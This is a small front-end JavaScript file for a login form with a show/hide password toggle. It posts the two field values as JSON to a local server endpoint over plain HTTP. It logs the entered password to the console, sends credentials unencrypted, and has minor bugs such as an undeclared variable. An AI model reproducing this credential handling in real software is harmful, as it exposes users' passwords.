const con = document.getElementById("con")
const input = document.getElementById("input1")
const input2 = document.getElementById("input2")
const btn = document.getElementById("btn")
const divpass = document.querySelector(".div-pass")
const showpass = document.querySelector(".show-pass")



input2.addEventListener("click", () => {

})


showpass.addEventListener("click", (e) => {
    e.preventDefault()
    if (input2.type === "password") {
        input2.type = "text"
        showpass.textContent = "Hide"
    } else {
        input2.type = "password"
        showpass.textContent = "Show"

    }

})

btn.addEventListener("click", async(event) => {
    event.preventDefault()
    const date = {
        input1: input1.value,
        input2: input2.value
    }
    console.log(date)
    const res = await fetch("http://localhost:5000/email", {
            method: "POST",
            body: JSON.stringify(date),
            headers: {
                "Content-Type": "application/json"
            }

        }).then(success => console.log("send dete successfuly"))
        .catch(error => console.log("Error"))



})